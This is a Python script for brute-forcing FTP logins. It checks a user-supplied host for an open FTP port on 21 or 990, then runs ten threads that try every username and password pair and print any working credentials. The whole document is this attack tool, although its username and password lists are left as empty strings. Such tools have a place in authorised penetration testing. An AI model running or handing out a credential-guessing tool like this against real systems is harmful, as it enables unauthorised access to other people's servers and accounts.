import socket
import threading
from ftplib import FTP
from concurrent.futures import ThreadPoolExecutor

valid_credentials_found = False
valid_credentials_found_lock = threading.Lock()


def check_open_port(target, ports=[21, 990]):
    for port in ports:
        try:
            with socket.create_connection((target, port), timeout=3):
                print(f"Port {port} is open.")
                return port
        except Exception:
            continue
    raise ConnectionError("No FTP service found on ports 21 or 990.")


def attempt_login(target, port, username, password):
    global valid_credentials_found

    with valid_credentials_found_lock:
        if valid_credentials_found:
            return

    try:
        ftp = FTP()
        ftp.connect(host=target, port=port, timeout=5)
        ftp.login(user=username, passwd=password)
        with valid_credentials_found_lock:
            if not valid_credentials_found:
                print(f"\nSuccess: {username}@{target}:{port} with password: {password}")
                valid_credentials_found = True
        ftp.quit()
        return True
    except Exception as e:
        with valid_credentials_found_lock:
            if valid_credentials_found:
                return
        print(f"Failed: {username}@{target}:{port} with password: {password} | Error: {e}")
        return False


def brute_ftp(target, port, username_list, password_list):
    print(f"\nUsernames: {len(username_list)} | Passwords: {len(password_list)}")

    try:
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for username in username_list:
                for password in password_list:
                    with valid_credentials_found_lock:
                        if valid_credentials_found:
                            break
                    futures.append(executor.submit(attempt_login, target, port, username, password))

            for future in futures:
                future.result()

        print(f"\nFinished. {len(password_list) * len(username_list)} credentials tested.")
        if not valid_credentials_found:
            print("No valid credentials found.")
    except KeyboardInterrupt:
        print("\nInterrupted by user. Exiting...")
        return


if __name__ == "__main__":
    target = input("Enter target IP or hostname: ").strip()
    if not target:
        raise ValueError("Target is required.")

    username_list = ""
    password_list = ""

    port = check_open_port(target)
    brute_ftp(target, port, username_list, password_list)


